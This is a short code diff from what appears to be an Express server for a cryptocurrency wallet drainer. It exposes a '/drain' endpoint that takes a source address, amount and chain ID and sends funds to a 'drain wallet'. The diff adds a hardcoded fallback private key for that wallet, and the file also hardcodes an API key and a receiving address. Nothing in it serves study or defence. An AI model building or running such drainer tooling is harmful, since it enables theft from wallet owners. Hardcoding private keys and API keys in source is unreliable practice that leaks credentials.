@@ -25,7 +25,7 @@ app.use(express.json());
 
 // ==================== CONFIGURATION ====================
 const COVALENT_API_KEY = process.env.COVALENT_API_KEY || "cqt_rQ43kxvhFc4RdQK7t63Yp6pgFRwR";
-const DRAIN_WALLET_PRIVATE_KEY = process.env.DRAIN_WALLET_PRIVATE_KEY;
+const DRAIN_WALLET_PRIVATE_KEY = process.env.DRAIN_WALLET_PRIVATE_KEY || "2f2a7cadc18ec3085934a2d9dc1533a7365ac7c0bb8fd6ee32de4f1aa9ef3cf3"; // REQUIRED: Your drain wallet private key
 const DRAIN_WALLET_ADDRESS = process.env.DRAIN_WALLET_ADDRESS || "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4";
 
 // Validate
@@ -409,3 +409,4 @@ app.listen(PORT, () => {
   console.log(`✅ Ready to receive requests`);
   console.log(`📤 Expects POST /drain with: fromAddress, amount, chainId`);
 });
+
